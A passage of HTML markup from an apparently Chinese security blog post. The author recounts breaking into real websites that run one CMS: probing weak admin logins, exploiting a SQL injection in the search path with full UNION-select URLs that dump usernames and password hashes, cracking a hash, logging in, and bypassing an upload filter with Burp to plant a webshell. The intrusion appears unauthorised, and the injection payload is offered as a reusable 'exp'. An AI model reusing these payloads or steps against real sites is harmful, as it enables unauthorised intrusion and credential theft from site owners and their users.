+		data-flex-grow=&#34;76&#34;
+		data-flex-basis=&#34;184px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不得不说。。。用的人真的少，这些漏洞都试了下，都没用啊。&lt;/p&gt;
+&lt;p&gt;还是看看后台吧，后面加个admin，得到后台之，各种弱口令，都没结果。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/05.png&#34;
+	width=&#34;728&#34;
+	height=&#34;346&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/05_hua670b4292d3b97b17a1733a5d394cfb2_39614_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/05_hua670b4292d3b97b17a1733a5d394cfb2_39614_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;210&#34;
+		data-flex-basis=&#34;504px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;竟然这样，从旁站下手好了。查了下，有这么多&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/06.png&#34;
+	width=&#34;1047&#34;
+	height=&#34;789&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/06_hu55d2e05bd8f3d12ecb26af87a25d9017_90209_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/06_hu55d2e05bd8f3d12ecb26af87a25d9017_90209_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;132&#34;
+		data-flex-basis=&#34;318px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我一个个找过去……全是这套程序。。我也很无奈啊&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/07.png&#34;
+	width=&#34;1387&#34;
+	height=&#34;839&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/07_hu55f53384775dde62e8dce4a2998e28ee_263740_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/07_hu55f53384775dde62e8dce4a2998e28ee_263740_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;396px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没办法，硬着头皮看了看主站，随便点了个连接貌似伪静态啊。试了半天还是放弃了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/08.png&#34;
+	width=&#34;503&#34;
+	height=&#34;67&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/08_hu114ec0ecc8c97fb716915e634cd1d93d_57439_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/08_hu114ec0ecc8c97fb716915e634cd1d93d_57439_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;750&#34;
+		data-flex-basis=&#34;1801px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;继续翻其他站，在一个站的首页发现这个。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/09.png&#34;
+	width=&#34;240&#34;
+	height=&#34;97&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/09_huf8f9781d6f3591e556f9a90cf4d0feed_7103_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/09_huf8f9781d6f3591e556f9a90cf4d0feed_7103_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;247&#34;
+		data-flex-basis=&#34;593px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;尝试下post注入。加个单引号&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/10.png&#34;
+	width=&#34;287&#34;
+	height=&#34;172&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/10_hu150a1cb0c4d89dc5e7ff4a3eee88a3b7_4416_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/10_hu150a1cb0c4d89dc5e7ff4a3eee88a3b7_4416_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;400px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;好吧 刚准备放弃….过了几秒钟 自动跳转到到了另一个页面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/11.png&#34;
+	width=&#34;817&#34;
+	height=&#34;767&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/11_hu64318fc8a77843eb4068aa0c3ef32e53_265692_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/11_hu64318fc8a77843eb4068aa0c3ef32e53_265692_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;106&#34;
+		data-flex-basis=&#34;255px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;继续在搜索框那输入了些查询内容点击检索&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/12.png&#34;
+	width=&#34;457&#34;
+	height=&#34;141&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/12_hu76ec2c6c3aca38de78fc77088eae0e4a_3933_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/12_hu76ec2c6c3aca38de78fc77088eae0e4a_3933_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;324&#34;
+		data-flex-basis=&#34;777px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/13.png&#34;
+	width=&#34;630&#34;
+	height=&#34;768&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/13_hue00be99fbcbb5316700d26e6503b1bba_215779_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/13_hue00be99fbcbb5316700d26e6503b1bba_215779_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;82&#34;
+		data-flex-basis=&#34;196px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Search后面多了个24，怪我手贱去加个个单引号………报错了（头一次人品爆发）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/14.png&#34;
+	width=&#34;1001&#34;
+	height=&#34;507&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/14_hu5b93da220b70cbe69fae68ae2be33e28_196220_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/14_hu5b93da220b70cbe69fae68ae2be33e28_196220_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;197&#34;
+		data-flex-basis=&#34;473px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;And 1=1 和and 1=2返回结果&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/15.png&#34;
+	width=&#34;882&#34;
+	height=&#34;741&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/15_hu11604dfb93602d0c1ad9d985393ca507_387277_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/15_hu11604dfb93602d0c1ad9d985393ca507_387277_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;119&#34;
+		data-flex-basis=&#34;285px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/16.png&#34;
+	width=&#34;818&#34;
+	height=&#34;804&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/16_hu2055b8ab0ed21493532d8010e5a9f7c3_280406_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/16_hu2055b8ab0ed21493532d8010e5a9f7c3_280406_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;101&#34;
+		data-flex-basis=&#34;244px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;确定已经存在注入，这次就用手工注入吧。&lt;/p&gt;
+&lt;p&gt;先order by猜下字段长度&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010&lt;/a&gt;  返回正常&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011&lt;/a&gt; 返回错误&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10&lt;/a&gt;结果如下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/17.png&#34;
+	width=&#34;1052&#34;
+	height=&#34;731&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/17_hu6dec4bbc22ecabb79b8a123e29a5295f_462538_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/17_hu6dec4bbc22ecabb79b8a123e29a5295f_462538_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;143&#34;
+		data-flex-basis=&#34;345px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没有显错位啊，加个and 1=2试试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/18.png&#34;
+	width=&#34;412&#34;
+	height=&#34;138&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/18_huc1408ea180b276733d6fb14515a97b7d_4987_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/18_huc1408ea180b276733d6fb14515a97b7d_4987_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;298&#34;
+		data-flex-basis=&#34;716px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;显错位替换成database()和version()，版本是5.0以上，有个默认数据库information&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/19.png&#34;
+	width=&#34;530&#34;
+	height=&#34;121&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/19_hu3581b5c868f2bfced96c5ec9f27af0e6_17280_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/19_hu3581b5c868f2bfced96c5ec9f27af0e6_17280_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;438&#34;
+		data-flex-basis=&#34;1051px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;User(),不是root权限&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/20.png&#34;
+	width=&#34;204&#34;
+	height=&#34;57&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/20_hu53d0601a283176081f346f13f2cae120_1688_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/20_hu53d0601a283176081f346f13f2cae120_1688_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;357&#34;
+		data-flex-basis=&#34;858px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来查表名&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat%28table_name%29,3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D&lt;/a&gt;(这是数据库的hex码，xxx代表马赛克……)&lt;/p&gt;
+&lt;p&gt;​    &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/21.png&#34;
+	width=&#34;1467&#34;
+	height=&#34;181&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/21_hue1d9b09c96fcab3c7845bb052c24f8dc_12274_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/21_hue1d9b09c96fcab3c7845bb052c24f8dc_12274_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;810&#34;
+		data-flex-basis=&#34;1945px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;出来很多啊，用审查元素全部复制下来&lt;/p&gt;
+&lt;p&gt;flexi_announcement,flexi_bbcode,flexi_channel,flexi_channel_config,flexi_config,flexi_content,flexi_content_subject,flexi_feedback,flexi_file,flexi_file_watermark,flexi_inquiry,flexi_link,flexi_link_category,flexi_log,flexi_message,flexi_page,flexi_search_cache,flexi_tag,flexi_tag_related,flexi_tpl_block,flexi_user,flexi_user_admin,flexi_u&lt;/p&gt;
+&lt;p&gt;起初以为是flexi_user_admin这个表，后来发现帐号密码存在flexi_user这个表中&lt;/p&gt;
+&lt;p&gt;接下来查他字段&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat%28column_name%29,3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;​    &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/22.png&#34;
+	width=&#34;1352&#34;
+	height=&#34;230&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/22_hucac2f4f441b85b9304e611ca64afa7f4_13496_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/22_hucac2f4f441b85b9304e611ca64afa7f4_13496_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;587&#34;
+		data-flex-basis=&#34;1410px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;id,name,password,hit_question,hit_answer,email,real_name,gender,birthday,province,address,post_code,phone_code,mphone_code,group_id,reg_time,last_login_time,last_login_ip,login_count,post_count,manager,locked,new_msg_count,memo&lt;/p&gt;
+&lt;p&gt;经验判断存放帐号密码的字段是name和password&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;​    &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/23.png&#34;
+	width=&#34;580&#34;
+	height=&#34;112&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/23_hu8a1547b9430fdcc74f2981f9e593ed27_4729_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/23_hu8a1547b9430fdcc74f2981f9e593ed27_4729_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;517&#34;
+		data-flex-basis=&#34;1242px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;就这样，帐号密码已经出来了&lt;/p&gt;
+&lt;p&gt;利用构造出来的exp:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,pass word,9,10%20from%20flexi_user&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;去主站访问下&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/24.png&#34;
+	width=&#34;558&#34;
+	height=&#34;212&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/24_hud37cab214e7965655c22c2c4486f0610_10643_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/24_hud37cab214e7965655c22c2c4486f0610_10643_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;263&#34;
+		data-flex-basis=&#34;631px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;哈哈  帐号密码到手 数了一下是40位…….然后去百度看了看&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/25.png&#34;
+	width=&#34;582&#34;
+	height=&#34;594&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/25_hude4f4ea1b6459dc1d35979689f4d5430_113319_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/25_hude4f4ea1b6459dc1d35979689f4d5430_113319_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;97&#34;
+		data-flex-basis=&#34;235px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;………..说是md5的  然后我仔细看了看文章…..屌用都没  我去官网下载了套源码&lt;/p&gt;
+&lt;p&gt;查看代码发现是sha1加密&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/26.png&#34;
+	width=&#34;786&#34;
+	height=&#34;50&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/26_hu334d9f8028f6531dcbf3fdd7f230f0ec_53978_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/26_hu334d9f8028f6531dcbf3fdd7f230f0ec_53978_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1572&#34;
+		data-flex-basis=&#34;3772px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拿起密码就去cmd5.com解密，悲剧来了………&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/27.png&#34;
+	width=&#34;631&#34;
+	height=&#34;282&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/27_hu61e49fa9946542cd6b28d559417631c5_8392_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/27_hu61e49fa9946542cd6b28d559417631c5_8392_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;223&#34;
+		data-flex-basis=&#34;537px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Oh Fuck&lt;/p&gt;
+&lt;p&gt;试了试另外一个，也是一样的结果…..&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/28.png&#34;
+	width=&#34;599&#34;
+	height=&#34;248&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/28_huedb54658d362c794f3a4ee01270f6b24_8076_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/28_huedb54658d362c794f3a4ee01270f6b24_8076_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;241&#34;
+		data-flex-basis=&#34;579px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后看了看其他网站，可能真的人品爆发，有个站解密成功了&lt;/p&gt;
+&lt;p&gt;然后登录之。&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/29.png&#34;
+	width=&#34;950&#34;
+	height=&#34;675&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/29_hu63e04c63c2043010cbdbc9e6c6827dfe_283588_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/29_hu63e04c63c2043010cbdbc9e6c6827dfe_283588_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;140&#34;
+		data-flex-basis=&#34;337px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;大概看了看网站后台，在这添加上php&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/30.png&#34;
+	width=&#34;1005&#34;
+	height=&#34;70&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/30_huf14629e057386be5fe37c0ded4f2b406_5557_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/30_huf14629e057386be5fe37c0ded4f2b406_5557_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1435&#34;
+		data-flex-basis=&#34;3445px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;找到个上传文件的地方，感觉shell就在眼前&lt;/p&gt;
+&lt;p&gt;​     &lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/31.png&#34;
+	width=&#34;491&#34;
+	height=&#34;360&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/31_huc7bf231d3a7150f6d7ac37fd80053349_27187_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/31_huc7bf231d3a7150f6d7ac37fd80053349_27187_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;136&#34;
+		data-flex-basis=&#34;327px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;点击上传发现…………我真是个命苦的人啊&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/32.png&#34;
+	width=&#34;928&#34;
+	height=&#34;369&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/32_hu24ee8d81e7f1af63c782ac0b04c5f6b4_51913_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/32_hu24ee8d81e7f1af63c782ac0b04c5f6b4_51913_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;251&#34;
+		data-flex-basis=&#34;603px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;只能拿出我苦练多年的打狗大法…….拿起burp抓包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/33.png&#34;
+	width=&#34;545&#34;
+	height=&#34;63&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/33_hubd3018f284e6ef90b0ca088ef0d0f5f4_5981_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/33_hubd3018f284e6ef90b0ca088ef0d0f5f4_5981_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;865&#34;
+		data-flex-basis=&#34;2076px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在这里构造畸形的http，然后放包，成功上传。（自带滑稽表情）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/34.png&#34;
+	width=&#34;478&#34;
+	height=&#34;282&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/34_hu62dc3136957d8f43a2082b85ed8c9f41_4037_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/34_hu62dc3136957d8f43a2082b85ed8c9f41_4037_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;406px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/35.png&#34;
+	width=&#34;155&#34;
+	height=&#34;162&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/35_hua787be30e25ebb4d7b5288f025feb2f3_3788_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/35_hua787be30e25ebb4d7b5288f025feb2f3_3788_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;95&#34;
+		data-flex-basis=&#34;229px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;点击那个放大镜&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/36.png&#34;
+	width=&#34;680&#34;
+	height=&#34;330&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/36_huf392f8c70d38b99d4c8cf003a09528a3_130491_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/36_huf392f8c70d38b99d4c8cf003a09528a3_130491_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;206&#34;
+		data-flex-basis=&#34;494px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;源码暴露了路径也不对劲…….看来不是他真实路径。&lt;/p&gt;
